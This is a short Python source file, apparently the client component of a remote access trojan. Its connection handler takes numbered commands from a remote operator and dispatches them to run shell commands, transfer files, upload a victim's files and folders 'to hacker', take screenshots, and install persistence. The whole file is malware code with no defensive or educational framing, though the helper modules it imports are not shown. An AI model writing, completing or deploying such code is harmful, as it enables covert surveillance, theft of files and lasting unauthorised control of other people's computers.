from core.command_client import execute_command
from core.download_client import download_file
from core.send2hacker_client import upload_file_folder
from core.screenshot_client import capture_screenshot
from core.persistent_client import become_persistent


def handleConnection(my_socket):
    print("[+] Handling connection")

    while True:
        user_input = my_socket.receive_data()

        print("[+] User input: ", user_input)

        if user_input == "1":
            print("[+] Running system commands")
            # function that will run commands
            execute_command(my_socket)

        elif user_input == "2":
            print("[+] Downloading file...")
            download_file(my_socket)

        elif user_input == "3":
            print("[+] Uploading to hacker...")
            upload_file_folder(my_socket)

        elif user_input == "4":
            my_socket.change_dir()

        elif user_input == "5":
            capture_screenshot(my_socket)

        elif user_input == "6":
            become_persistent(my_socket)

        elif user_input == "99":
            break

        else:
            print("[+] Invalid user input")
